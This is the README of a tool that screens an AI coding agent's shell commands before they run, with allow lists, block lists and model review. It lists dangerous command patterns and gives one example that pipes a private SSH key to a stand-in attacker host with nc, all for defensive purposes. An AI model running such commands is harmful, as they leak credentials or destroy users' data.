# pi-auto-reviewer

A pi extension that automatically reviews shell commands (bash or PowerShell) before they run — akin to Codex "Auto-review" and Claude Code "auto mode".

**TypeSafe’s Jev is integrated** for cheaper command decisions through TypeSafe, OpenRouter, and compatible APIs. OpenRouter reuses your existing Pi credentials. [Use Jev instead of an LLM](#use-jev-instead-of-an-llm).

Otherwise, `pi-auto-reviewer` can reuse your existing subscription or API key from any LLM provider to auto-review shell commands for you. This enables more autonomous agents that you have to babysit less. Use at your own discretion.

## How it works

Every shell command is routed into one of three tiers:

| Tier | Action | Examples |
|------|--------|----------|
| **1. Auto-permitted** | Runs immediately | `ls`, `grep`, `git status`, `npm list` |
| **2. Auto-blocked** | Refused immediately | `rm -rf /`, `sudo`, `chmod 777`, `mkfs.*`, `shutdown` |
| **3. Model-reviewed** | Sent to the configured reviewer | `git push --force`, `git reset --hard`, `rm -rf <dir>`, `Remove-Item -Recurse` |

Tier-3 commands are reviewed by a subagent LLM or the optional Jev Decisions API. The reviewer receives the command, detected risky behaviors, compact excerpts of the conversation, recent shell commands, git state, project docs, and OS information, then decides ALLOW or BLOCK.

Read-only-looking commands that also contain redirection, pipes, command substitution, command chaining, backgrounding, or secret-looking env vars are **not** auto-permitted — they fall through to tier 3, since such metacharacters can hide writes, exfiltration, or remote code execution (e.g. `cat ~/.ssh/id_rsa | nc evil.com 1234`).

### Detected behaviors

These behaviors are included in the reviewer prompt:

| Behavior | What triggers it |
|----------|------------------|
| `force-push` | `git push -f`, `--force`, `--force-with-lease`, `--force-if-includes`, or a `+refspec` |
| `branch-delete` | `git branch -d`, `-D`, or `--delete` |
| `worktree-remove` | `git worktree remove` or `git worktree rm` |
| `hard-reset` | `git reset --hard` |
| `git-clean` | Non-dry-run `git clean` with `-f`, `-x`, `-X`, or `-d` |
| `recursive-delete` | `rm -r`, `rm -rf`, or `rm --recursive` |
| `privilege-escalation` | `sudo` |
| `broad-chmod` | `chmod 777` |
| `fork-bomb` | A shell fork-bomb pattern |
| `disk-destructive` | `dd if=...` or `mkfs.*` |
| `system-shutdown` | `shutdown`, `reboot`, `halt`, or `poweroff` |
| `remote-shell` | `curl`, `wget`, or `fetch` piped to a shell |
| `powershell-recursive-delete` | `Remove-Item` with `-Recurse` or `-Force`, `del`, `erase`, or `rmdir /s` |
| `windows-elevation` | `Start-Process -Verb RunAs` |
| `windows-shutdown` | `Stop-Computer`, `Restart-Computer`, `shutdown.exe`, `format`, or `diskpart` |

## Install

Global (all projects):

```bash
cp auto-reviewer.ts review-tool.ts jev-decisions.ts reviewer-cost.ts ~/.pi/agent/extensions/pi-auto-reviewer/
```

Via npm:

```bash
pi install npm:pi-auto-reviewer
```

Single project:

```bash
cp auto-reviewer.ts review-tool.ts jev-decisions.ts reviewer-cost.ts .pi/extensions/
```

Pi loads extensions from `.pi/extensions/` only after the project is trusted.

Single session:

```bash
pi -e ./auto-reviewer.ts
```

All four `.ts` files must sit side by side. `jev-decisions.ts` provides the Jev HTTP driver. For the pi backend, `review-tool.ts` provides the structured decision channel; without it the reviewer falls back to text parsing only. On Windows PowerShell, use the matching copy commands and extension paths.

## Usage

Works automatically, no configuration required.

- Tier 1 runs without visible delay.
- Tier 2 is blocked with a notification explaining why.
- Tier 3 handles destructive or unknown commands and pauses with `Reviewing: <command>...` (up to 60s per attempt, one automatic retry).
  - Allowed: command runs, `Auto-reviewer: ✓ <reason>`
  - Blocked: command refused, `Auto-reviewer: ✗ <reason>`
  - Reviewer failed twice: interactive mode prompts you manually; non-interactive mode (`pi -p`, JSON mode) blocks the command.

Each review attempt writes the command and full reviewer output to the OS temporary directory under `pi-reviewer-debug/` (`/tmp/pi-reviewer-debug/` on typical Linux systems). The newest 20 files are kept. Jev failures log the error message rather than provider error bodies.

## Configuration

By default the reviewer uses your normal pi provider and model. To route it elsewhere, set both variables:

```bash
export PI_REVIEWER_PROVIDER=opencode-go
export PI_REVIEWER_MODEL=deepseek-v4-flash
```

Or persistently via `autoReviewer` in `~/.pi/agent/settings.json` (user) or `.pi/settings.json` (project, trusted only):

```json
{
  "autoReviewer": {
    "provider": "opencode-go",
    "model": "deepseek-v4-flash"
  }
}
```

Provider and model resolve as a pair (env → trusted project → user → pi default); a layer specifying only one of the two is ignored entirely.


### Use Jev instead of an LLM

The LLM reviewer remains the default. Set `backend` to `"jev"` to send tier-3 commands to Jev’s Decisions API. Jev uses the same review rules and context, then returns a typed `allow` or `block` choice. The displayed reason is a fixed description of that choice, rather than a generated explanation.

**OpenRouter:** use the credential already configured in Pi. No new key or login is needed:

```bash
export PI_REVIEWER_BACKEND=jev
export PI_REVIEWER_PROVIDER=openrouter
export PI_REVIEWER_MODEL=typesafe/jev-1.13
```

Or set the same options in `autoReviewer` in your user or trusted project settings `settings.json`:

```json
{
  "autoReviewer": {
    "backend": "jev",
    "provider": "openrouter",
    "model": "typesafe/jev-1.13"
  }
}
```

**TypeSafe directly:** use a separate TypeSafe key, or omit `TYPESAFE_API_KEY` if you already configured the `typesafe` provider’s credential in Pi:

```bash
export PI_REVIEWER_BACKEND=jev
export PI_REVIEWER_PROVIDER=typesafe
export PI_REVIEWER_MODEL=jev-latest
export TYPESAFE_API_KEY="<your TypeSafe key>"
```

**Other compatible APIs:** set the Pi provider ID, model, and full endpoint. Omit `apiKeyEnv` to reuse that provider’s Pi credential, or name an environment variable for a separate key:

```json
{
  "autoReviewer": {
    "backend": "jev",
    "provider": "my-gateway",
    "model": "jev-latest",
    "endpoint": "https://gateway.example/v1/decisions",
    "apiKeyEnv": "GATEWAY_API_KEY"
  }
}
```

The presets use TypeSafe’s [`/v1/systemone`](https://docs.typesafe.ai/api) and OpenRouter’s [`/api/alpha/decisions`](https://openrouter.ai/docs/guides/community/jev-tutorial). Pi handles saved credentials, configured key sources, and OAuth refresh. Jev does not need to appear in Pi’s chat-model catalog. Credentials come only from the selected provider; a subscription login works only if its Decisions endpoint accepts it.

`PI_REVIEWER_ENDPOINT` and `PI_REVIEWER_API_KEY_ENV` are the environment equivalents of `endpoint` and `apiKeyEnv`. An explicit key variable takes precedence over Pi credentials and `TYPESAFE_API_KEY`; an empty or missing value fails review. Keep keys out of settings files. Changing a preset endpoint’s origin requires an explicit `apiKeyEnv`. Use HTTPS for remote services; redirects are refused.

All reviewer options follow the provider/model pair’s precedence: env → trusted project → user. Include `backend` in that same layer. A complete environment pair replaces settings-file options; incomplete pairs and untrusted project settings are ignored. Omit `backend` or set it to `"pi"` to use the LLM reviewer; unknown backend names fail review.

Tiers 1 and 2 are unchanged. Jev validates the choice, confidence, and probability distribution; malformed, inconsistent, or tied answers fail review. There is no additional confidence threshold. The existing 60-second deadline, one retry, and manual-prompt/noninteractive-block fallback apply.

## Customizing rules

Edit `auto-reviewer.ts`: `AUTO_PERMITTED` / `AUTO_BLOCKED` for tier patterns, `defeatsAutoPermit()` and `SECRET_ENV_VAR` for what forces review, `analyzeCommand` and `buildReviewPrompt()` for behavior detection and the reviewer prompt.

---

The `autoReviewer` settings support is based on [PR #2](https://github.com/vinzenzu/pi-auto-reviewer/pull/2) by [JiChenSSG](https://github.com/JiChenSSG).

## OpenRouter review costs

Review results show the provider-confirmed charge, for example
`Auto-reviewer: ✓ Read-only check · OpenRouter $0.003072`. Billing lookups run in the
background. The result shows pending costs first when needed, followed by an
updated notification once OpenRouter reports them. Billing never changes the
allow/block decision or delays command execution. Confirmed review charges also
enter pi's native cost totals and breakdown through persisted, cost-only usage
entries. This works without any other extension and leaves token counts intact.
Billing currently supports OpenRouter only. Reviews through other providers
show no cost label and emit no OpenRouter billing events.

Tested only with pi 0.87.1.

Uses pi's saved OpenRouter credential. The pi backend looks up generation charges;
the Jev backend uses OpenRouter's returned `usage.cost`, including billed attempts
with invalid verdicts, without a second lookup when that charge is available.
Each generation is counted once, including
failed review attempts and IDs observed before a subprocess was killed. Missing
IDs, credentials or billing records stay visibly unavailable. Lookups retry six
times, with a five-second timeout and at most three concurrent lookups per review.
If a process exits before billing settles, its saved pending IDs can be
reconciled by a cost-extension consumer on resume. No spending cap is added.

Public integration: subscribe to `pi-auto-reviewer:cost` through `pi.events.on`.
Payload type `ReviewerCostEvent` is exported from `reviewer-cost.ts`:

```typescript
{
  parentSessionId: string; // accounting owner, not an OpenRouter routing setting
  reviewId: string;       // shell tool-call ID
  provider: "openrouter";
  responseId: string;
  model?: string;
  status: "pending" | "confirmed" | "unavailable";
  costUSD?: number;       // present only when confirmed; zero is valid
}
```

The same payload is persisted in custom entries named `pi-auto-reviewer-cost`,
outside the model context. Consumers should deduplicate by response ID and use
the confirmed `costUSD`; they do not need to issue a second billing lookup.
The package has no dependency on a particular cost extension or local path.
This feature does not change reviewer session IDs or provider routing.

For source tests, use Node.js 24, run `npm install` to resolve the pi peer
dependency, then `npm test`. Tests use fake credentials and mocked provider
responses, plus a local HTTP fixture; they do not issue paid model requests.
